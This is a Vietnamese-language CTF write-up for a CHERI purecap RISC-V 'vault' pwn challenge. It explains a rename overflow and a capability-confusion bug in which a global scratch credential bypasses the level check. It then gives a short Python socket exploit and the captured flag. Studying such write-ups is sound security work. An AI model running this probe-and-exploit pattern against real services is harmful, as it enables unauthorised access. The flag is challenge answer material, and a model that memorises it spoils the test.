---
title: "PWN#Zeta"
category: "Pwn"
tags: ["cheri", "purecap", "riscv", "capability-confusion", "freebsd", "cheribsd", "vault"]
solve_date: "2026-11-04T11:20:00+07:00"
language: "vi"
points: 130
---

# PWN#Zeta — CHERI purecap: nhầm lẫn credential trong vault

**Flag:** CTF{5429e37a657bad87823e1268693a5a59}  
**Service:** 169.58.126.107:5012  
**Định dạng flag:** CTF{...}

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| vault (CheriBSD / FreeBSD 15, RISC-V CHERI purecap) | 12,904 | 7e5f0f6740269db2f12a30ded2e89a25a12dd9891a36cb0042bbb7bb749d6d3a |

## Đề bài

> PWN#Zeta — 130 điểm. Làm vault trả về ACCESS GRANTED.

Handout là ELF64 RISC-V đã strip, build cho CHERI purecap ABI (UCB RISC-V, RVC, double-float ABI; interpreter /libexec/ld-elf.so.1; FreeBSD 15 / CheriBSD). Service có menu dạng dòng: phần profile (create, link, rename, destroy) và phần vault (preview, scratch, open).

## Phân tích

### Handout

file nhận diện target là CHERI purecap binary:

```
ELF 64-bit LSB pie executable, UCB RISC-V, RVC, double-float ABI,
version 1 (SYSV), dynamically linked, interpreter /libexec/ld-elf.so.1,
for FreeBSD 15.0 (1500040), FreeBSD-style, stripped
```

strings khôi phục menu và các thông báo quan trọng quanh vault:

```
handle %d created (preview credential, level=%lu)
scratch credential set (level=%lu, not saved anywhere)
ACCESS GRANTED: %s
access denied (level=%lu)
dangling capability, denied
corrupt handle
flag.txt
```

Binary dùng PIE và đã strip; .text chỉ dài 0x888 byte. Imports gồm malloc/free, fgets/fread, printf/puts, strtoul/atoi, fopen/fclose. Binutils phổ biến và Ghidra không decode instruction xcheri, nhưng không cần reverse từng instruction để tìm bug này.

### Hành vi menu

Gửi lệnh menu qua socket giúp dựng object model:

| Command | Hành vi |
|---|---|
| [1] create_profile <name> | cấp profile: char name[24], tiếp theo uint64_t tier = 1 |
| [2] link_profile <id> | luôn trả not vault-linkable (cosmetic only) |
| [3] rename_profile <id> | đọc raw line rồi ghi tối đa 32 byte vào name |
| [4] destroy_profile <id> | giải phóng profile |
| [5] vault_preview | tạo handle dùng preview credential, level=1 |
| [6] vault_scratch <level> | tạo scratch credential với level do attacker chọn |
| [7] vault_open <id> | kiểm tra credential rồi đọc flag.txt |
| [8] debug_dump_profile <id> | mồi nhử, in name=%.24s tier=%lu |

rename_profile có overflow rõ ràng: prompt nói “tối đa 24 byte”, nhưng 32 byte được ghi vào profile, nên field tier ở offset 24 hoàn toàn do attacker kiểm soát. debug_dump_profile xác nhận (ghi 0xdeadbeef thì in tier=3735928559). Đây là bug thật nhưng không cần để giải.

### Lỗi vault

Hai probe xác định logic phân quyền:

```
[5] vault_preview          -> handle 0 created (preview credential, level=1)
[7] vault_open 0           -> access denied (level=1)
```
```
[5] vault_preview          -> handle 0 created (preview credential, level=1)
[6] vault_scratch 0        -> scratch credential set (level=0, not saved anywhere)
[7] vault_open 0           -> ACCESS GRANTED: CTF{...}
```

Mọi scratch level đều dùng được — 0, 1, 2, 5, 10, 100 đều được cấp quyền — và có thể mở bất kỳ handle id nào đang tồn tại. Handle vẫn phải hợp lệ (vault_open 5 trả bad handle), nghĩa là lookup trong handle table diễn ra trước. Thứ tự thao tác cũng quan trọng:

```
[6] vault_scratch 7        -> scratch credential set (level=7, not saved anywhere)
[5] vault_preview          -> handle 0 created (preview credential, level=1)
[7] vault_open 0           -> access denied (level=1)
```

vault_preview ghi đè cùng global slot mà vault_scratch ghi. Vì vậy cần tạo handle trước, rồi mới cài scratch credential.

Root cause: vault_scratch công bố capability tới scratch credential tạm thời trong một global “current credential” slot. vault_open xác thực handle id, sau đó dùng credential global đó thay vì credential riêng của handle và xem như đã authenticated mà không áp dụng level check. Credential được mô tả rõ là “not saved anywhere” — không được thiết kế để tồn tại sau lời gọi — nhưng global reference vẫn giữ nó reachable. Đây là capability-confusion: capability tạm trở thành authorization token. CHERI bounds và tag check không giúp được vì capability đó hợp lệ với object mà nó trỏ tới.

## Khai thác

Toàn bộ exploit chỉ cần ba lệnh menu theo đúng thứ tự:

```python
#!/usr/bin/env python3
import re, socket

HOST, PORT = "169.58.126.107", 5012

s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall(b"5\n6\n0\n7\n0\n")      # preview -> scratch 0 -> open handle 0

data = b""
s.settimeout(3)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except socket.timeout:
    pass

print(re.search(rb"CTF\{[0-9a-f]+\}", data).group().decode())
```
```
$ python3 solve.py
CTF{5429e37a657bad87823e1268693a5a59}
```

## Flag

```
CTF{5429e37a657bad87823e1268693a5a59}
```
